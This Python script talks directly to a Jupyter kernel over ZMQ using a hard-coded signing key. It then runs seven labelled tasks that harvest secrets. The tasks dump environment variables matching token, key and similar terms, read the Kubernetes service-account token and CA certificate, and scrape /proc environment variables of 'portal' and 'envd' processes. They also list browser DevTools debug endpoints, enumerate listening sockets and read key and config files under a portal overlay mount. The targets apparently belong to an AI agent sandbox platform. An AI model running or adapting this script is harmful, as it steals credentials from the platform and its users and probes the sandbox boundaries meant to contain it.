#!/usr/bin/env python3
"""
Direct ZMQ client to Jupyter kernel v2 — reads IOPub for stdout.
"""
import zmq, json, uuid, hmac, hashlib, time, os, sys

import os

CONN = {
    "shell_port": 45765,
    "iopub_port": 42155,
    "stdin_port": 48519,
    "control_port": 49897,
    "hb_port": 52043,
    "ip": "127.0.0.1",
    "key": os.environ.get("ZMQ_KERNEL_KEY", "8cd0b77c-f7c465fb30650ed932e98c5b"),
    "transport": "tcp",
    "signature_scheme": "hmac-sha256",
    "kernel_name": "python3"
}

class KernelClient:
    def __init__(self):
        self.key = CONN["key"].encode()
        self.session = str(uuid.uuid4())
        self.ctx = zmq.Context()
        self.shell = self.ctx.socket(zmq.DEALER)
        self.shell.connect(f"tcp://{CONN['ip']}:{CONN['shell_port']}")
        self.iopub = self.ctx.socket(zmq.SUB)
        self.iopub.connect(f"tcp://{CONN['ip']}:{CONN['iopub_port']}")
        self.iopub.setsockopt_string(zmq.SUBSCRIBE, "")
        print(f"[+] Connected to kernel {CONN['ip']}:{CONN['shell_port']}")

    def _sign(self, msg_list):
        auth = hmac.new(self.key, digestmod=hashlib.sha256)
        for m in msg_list:
            auth.update(m if isinstance(m, bytes) else m.encode())
        return auth.hexdigest()

    def _send(self, msg_type, content):
        header = json.dumps({
            "msg_id": str(uuid.uuid4()),
            "username": "kernel",
            "session": self.session,
            "msg_type": msg_type,
            "version": "5.3",
            "date": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        })
        content_json = json.dumps(content)
        msg_list = [header, "{}", "{}", content_json]
        sig = self._sign(msg_list)
        parts = [b"<IDS|MSG>", sig.encode(), header.encode(), b"{}", b"{}", content_json.encode()]
        self.shell.send_multipart(parts)

    def execute(self, code, timeout=30):
        self._send("execute_request", {
            "code": code, "silent": False, "store_history": True,
            "user_expressions": {}, "allow_stdin": False
        })
        
        poller = zmq.Poller()
        poller.register(self.shell, zmq.POLLIN)
        poller.register(self.iopub, zmq.POLLIN)
        
        outputs = []
        start = time.time()
        execute_reply = None
        
        while time.time() - start < timeout:
            socks = dict(poller.poll(500))
            
            if self.iopub in socks:
                resp = self.iopub.recv_multipart()
                if len(resp) >= 6:
                    try:
                        header = json.loads(resp[2].decode())
                        content = json.loads(resp[4].decode())
                        msg_type = header.get("msg_type", "")
                        if msg_type == "stream":
                            outputs.append(content.get("text", ""))
                        elif msg_type == "execute_result":
                            outputs.append(content.get("data", {}).get("text/plain", ""))
                        elif msg_type == "error":
                            outputs.append("ERROR: " + "\n".join(content.get("traceback", [])))
                    except:
                        pass
            
            if self.shell in socks:
                resp = self.shell.recv_multipart()
                if len(resp) >= 6:
                    try:
                        header = json.loads(resp[2].decode())
                        content = json.loads(resp[4].decode())
                        if header.get("msg_type") == "execute_reply":
                            execute_reply = content
                            if content.get("status") == "ok":
                                # Wait a bit more for iopub
                                time.sleep(0.5)
                                # Drain remaining iopub
                                while True:
                                    socks2 = dict(poller.poll(200))
                                    if self.iopub in socks2:
                                        resp2 = self.iopub.recv_multipart()
                                        if len(resp2) >= 6:
                                            try:
                                                header2 = json.loads(resp2[2].decode())
                                                content2 = json.loads(resp2[4].decode())
                                                if header2.get("msg_type") == "stream":
                                                    outputs.append(content2.get("text", ""))
                                            except:
                                                pass
                                    else:
                                        break
                                break
                            elif content.get("status") == "error":
                                outputs.append("EXEC_ERROR: " + content.get("evalue", ""))
                                break
                    except:
                        pass
        
        return {"reply": execute_reply, "output": "".join(outputs)}

    def close(self):
        self.shell.close()
        self.iopub.close()
        self.ctx.term()


def main():
    client = KernelClient()

    # TASK 1: Extract all env vars with secrets
    print("\n[+] TASK 1: Environment secrets")
    result = client.execute("""
import os, json
secrets = {}
for k, v in os.environ.items():
    if any(x in k.lower() for x in ['token', 'key', 'secret', 'auth', 'jwt', 'api', 'password', 'credential', 'cert', 'tls', 'gateway', 'coding', 'agent', 'msh', 'kimi']):
        secrets[k] = v
print(json.dumps(secrets, indent=2))
""")
    print(result['output'][:3000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 2: Browser localStorage via CDP
    print("\n[+] TASK 2: Browser localStorage")
    result = client.execute("""
import urllib.request, json, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    r = urllib.request.urlopen('http://127.0.0.1:9222/json/list', timeout=3)
    pages = json.loads(r.read())
    for p in pages:
        if p.get('type') == 'page':
            ws_url = p['webSocketDebuggerUrl']
            print(f"Page: {p['url']} WS: {ws_url}")
            break
except Exception as e:
    print(f"Error: {e}")
""")
    print(result['output'][:2000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 3: Check K8s service account
    print("\n[+] TASK 3: Kubernetes service account")
    result = client.execute("""
import os, json
sa_path = '/var/run/secrets/kubernetes.io/serviceaccount/'
result = {'exists': os.path.exists(sa_path)}
if result['exists']:
    for f in ['token', 'ca.crt', 'namespace']:
        path = os.path.join(sa_path, f)
        if os.path.exists(path):
            with open(path) as fp:
                result[f] = fp.read()[:1000]
print(json.dumps(result, indent=2))
""")
    print(result['output'][:2000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 4: Portal process deep scan
    print("\n[+] TASK 4: Portal process deep scan")
    result = client.execute("""
import os, json, glob, subprocess
result = {'env': {}, 'cmdline': '', 'fds': [], 'cwd': '', 'exe': ''}
for pid in os.listdir('/proc'):
    if not pid.isdigit(): continue
    try:
        with open(f'/proc/{pid}/cmdline') as f:
            cmdline = f.read()
        if 'portal' in cmdline and 's6' not in cmdline:
            result['pid'] = pid
            result['cmdline'] = cmdline.replace('\x00', ' ')
            with open(f'/proc/{pid}/environ') as f:
                env = f.read().split('\x00')
                for e in env:
                    if any(x in e.lower() for x in ['token', 'key', 'secret', 'auth', 'jwt', 'api', 'gateway', 'coding', 'agent', 'msh', 'kimi']):
                        parts = e.split('=', 1)
                        result['env'][parts[0]] = parts[1] if len(parts) > 1 else ''
            try:
                result['cwd'] = os.readlink(f'/proc/{pid}/cwd')
                result['exe'] = os.readlink(f'/proc/{pid}/exe')
            except: pass
            fds = glob.glob(f'/proc/{pid}/fd/*')
            for fd in fds[:30]:
                try:
                    link = os.readlink(fd)
                    if any(x in link for x in ['socket', 'pipe', 'kimi', 'msh', 'token', 'key', 'secret', 'json', 'conf']):
                        result['fds'].append(link)
                except: pass
            break
    except: pass
print(json.dumps(result, indent=2, default=str))
""")
    print(result['output'][:3000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 5: Network listeners
    print("\n[+] TASK 5: Network listeners")
    result = client.execute("""
import subprocess, json
try:
    r = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
    print(r.stdout)
except:
    try:
        r = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True, timeout=5)
        print(r.stdout)
    except Exception as e:
        print(f"Error: {e}")
""")
    print(result['output'][:2000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 6: Check envd process
    print("\n[+] TASK 6: Envd process scan")
    result = client.execute("""
import os, json
result = {'env': {}, 'cmdline': ''}
for pid in os.listdir('/proc'):
    if not pid.isdigit(): continue
    try:
        with open(f'/proc/{pid}/cmdline') as f:
            cmdline = f.read()
        if 'envd' in cmdline and 's6' not in cmdline:
            result['pid'] = pid
            result['cmdline'] = cmdline.replace('\x00', ' ')
            with open(f'/proc/{pid}/environ') as f:
                env = f.read().split('\x00')
                for e in env:
                    if any(x in e.lower() for x in ['token', 'key', 'secret', 'auth', 'jwt', 'api', 'gateway', 'coding', 'agent', 'msh', 'kimi']):
                        parts = e.split('=', 1)
                        result['env'][parts[0]] = parts[1] if len(parts) > 1 else ''
            break
    except: pass
print(json.dumps(result, indent=2, default=str))
""")
    print(result['output'][:2000] if result['output'] else json.dumps(result['reply'], indent=2))

    # TASK 7: Check /mnt/portal-overlay for new files
    print("\n[+] TASK 7: Portal overlay files")
    result = client.execute("""
import os, json
result = {'files': []}
for root, dirs, files in os.walk('/mnt/portal-overlay'):
    for f in files:
        path = os.path.join(root, f)
        if f.endswith(('.json', '.yaml', '.yml', '.env', '.conf', '.py', '.sh', '.token', '.key')):
            try:
                with open(path) as fp:
                    content = fp.read()
                result['files'].append({'path': path, 'size': len(content), 'preview': content[:300]})
            except:
                pass
print(json.dumps(result, indent=2, default=str))
""")
    print(result['output'][:3000] if result['output'] else json.dumps(result['reply'], indent=2))

    client.close()
    print("\n[+] All tasks complete")

if __name__ == "__main__":
    main()
